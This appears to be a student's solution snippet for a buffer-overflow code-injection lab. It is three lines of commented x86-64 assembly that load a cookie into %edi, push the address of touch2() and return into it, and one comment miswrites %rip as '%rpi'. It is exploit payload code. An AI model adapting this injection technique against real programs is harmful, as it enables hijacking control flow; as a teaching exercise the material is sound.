movl $0x59b997fa,%edi	# Move cookie to %edi
pushq $0x4017ec		# Push the address of touch2() onto stack
retq			# The %rsp now points to the address of touch2(). The ret instruction points %rpi to %rsp and starts executing the injected code.
